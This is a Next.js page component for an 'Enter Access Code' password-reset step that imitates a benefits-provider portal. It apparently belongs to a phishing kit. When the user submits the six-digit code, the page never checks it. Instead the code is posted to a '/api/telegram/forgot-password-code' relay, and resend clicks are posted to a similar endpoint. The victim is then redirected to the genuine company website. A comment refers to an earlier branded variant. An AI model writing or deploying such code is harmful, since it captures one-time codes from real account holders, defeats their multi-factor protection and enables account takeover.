"use client"

import { Suspense, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { SiteFooter } from "@/components/site-footer"
import { SiteHeader } from "@/components/site-header"
import { HelpCircle } from "lucide-react"

/**
 * Post-completion hand-off for this portal.
 *
 * Same destination as `GET /api/login-out` (app/api/login-out/route.ts) — a user
 * who signs in, resets a password, or creates an account must all land in the
 * same place. Deliberately NOT derived from SITE_ORIGIN: the hand-off host is a
 * separate destination from the canonical SEO origin.
 *
 * Previously named ALIGHT_REDIRECT_URL and pointed at
 * https://nbs-auth.com/Authentication/Handshake — a leftover from an Alight
 * flavour, and inconsistent with the login hand-off.
 */
const HANDOFF_URL = "https://www.nationalbenefitservices.com/";

function EnterCodeContent() {
  const [code, setCode] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const router = useRouter()

  const handleVerify = async () => {
    if (isLoading) return
    setIsLoading(true)
    
    try {
      await fetch("/api/telegram/forgot-password-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code }),
      }).catch(console.error)
    } catch (error) {
      console.error("Failed to send code notification:", error)
    }
    
    await new Promise((r) => setTimeout(r, 1000))
    window.location.href = HANDOFF_URL
  }

  const handleResend = async () => {
    if (isResending) return
    setIsResending(true)
    
    try {
      await fetch("/api/telegram/forgot-password-resend", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      }).catch(console.error)
    } catch (error) {
      console.error("Failed to send resend notification:", error)
    }
    
    await new Promise((r) => setTimeout(r, 2000))
    setIsResending(false)
  }

  return (
    <div className="min-h-screen bg-white">
      <SiteHeader />
      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px]">
        <div className="mb-6">
          <div className="flex items-center gap-2 mb-4">
            <h2 className="text-base font-medium text-gray-900">Verify It&apos;s You</h2>
            <button
              type="button"
              className="text-[#254650] hover:underline flex items-center gap-1"
              aria-label="Help"
            >
              <HelpCircle className="w-4 h-4" />
              <span className="text-sm">Help</span>
            </button>
          </div>
          <h1 className="text-2xl font-semibold text-gray-900 mb-3">
            Enter Access Code
          </h1>
          <p className="text-gray-700 text-sm mb-4">
            Enter the code that was sent to you.
          </p>

          <div className="flex items-center gap-2 mb-4">
            <span className="text-gray-700 text-sm">Didn&apos;t receive code?</span>
            <button
              type="button"
              onClick={handleResend}
              disabled={isResending}
              className="px-3 py-1.5 bg-gray-200 text-gray-700 rounded-md text-sm font-medium hover:bg-gray-300 disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isResending ? "Loading..." : "Resend code"}
            </button>
          </div>
        </div>

        <div className="space-y-4">
          <div>
            <input
              type="text"
              id="code"
              inputMode="numeric"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
              placeholder=""
              className="w-full max-w-[200px] px-2.5 py-1.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#254650] focus:border-transparent"
              maxLength={6}
            />
          </div>

          <div className="flex gap-3 mt-3">
            <Button
              className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-8 px-5 text-sm font-medium"
              onClick={handleVerify}
              disabled={code.replace(/\D/g, "").length !== 6 || isLoading}
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>
            <Button
              variant="ghost"
              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-8 px-5 text-sm font-medium"
              onClick={() => router.push("/forgot-password-verify")}
            >
              Cancel
            </Button>
          </div>
        </div>
      </div>

      <SiteFooter />
    </div>
  )
}

export default function ForgotPasswordCodePage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
        Loading...
      </div>
    }>
      <EnterCodeContent />
    </Suspense>
  )
}
